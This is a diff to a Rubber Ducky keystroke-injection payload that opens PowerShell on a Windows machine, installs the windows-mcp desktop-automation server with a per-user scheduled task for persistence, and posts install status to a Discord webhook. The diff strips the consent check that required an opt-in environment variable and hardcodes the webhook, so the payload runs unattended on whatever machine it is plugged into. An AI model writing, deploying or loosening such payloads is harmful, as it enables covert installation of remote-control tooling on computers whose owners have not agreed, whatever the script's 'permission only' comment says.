@@ -1,7 +1,8 @@
 REM Windows-MCP Ducky installer with Discord status webhook
 REM Author: ooovenenoso
 REM Experimental payload. Use only on Windows systems where you have explicit permission.
-REM Requires WINDOWS_MCP_INSTALL_AUTHORIZED=YES and WINDOWS_MCP_DISCORD_WEBHOOK in the Windows user environment.
+REM Hardcoded-only payload: paste your Discord webhook into $webhook below before use.
+REM Do not publish a real Discord webhook URL in a public repo.
 REM Installs uv if missing, installs windows-mcp from PyPI, registers the per-user windows-mcp-server Scheduled Task, and posts install status only.
 DELAY 700
 GUI r
@@ -12,19 +13,11 @@ DELAY 1200
 STRING $ErrorActionPreference = 'Stop'
 ENTER
 DELAY 80
-STRING $consent = $env:WINDOWS_MCP_INSTALL_AUTHORIZED
+STRING $webhook = 'PASTE_DISCORD_WEBHOOK_URL_HERE'
 ENTER
 DELAY 80
-STRING if ($consent -ne 'YES') { throw 'Set WINDOWS_MCP_INSTALL_AUTHORIZED=YES before running this authorized Windows-MCP installer payload.' }
-ENTER
 DELAY 80
-STRING $webhook = $env:WINDOWS_MCP_DISCORD_WEBHOOK
-ENTER
-DELAY 80
-STRING if ([string]::IsNullOrWhiteSpace($webhook)) { throw 'Set WINDOWS_MCP_DISCORD_WEBHOOK before running this payload.' }
-ENTER
-DELAY 80
-STRING if ($webhook -notmatch '^https://(discord(app)?\.com|canary\.discord\.com)/api/webhooks/') { throw 'WINDOWS_MCP_DISCORD_WEBHOOK is not a Discord webhook URL.' }
+STRING if ($webhook -notmatch '^https://(discord(app)?\.com|canary\.discord\.com)/api/webhooks/') { throw 'Hardcoded webhook is not a Discord webhook URL. Replace PASTE_DISCORD_WEBHOOK_URL_HERE first.' }
 ENTER
 DELAY 80
 STRING $logDir = Join-Path $env:USERPROFILE '.windows-mcp-ducky-installer'
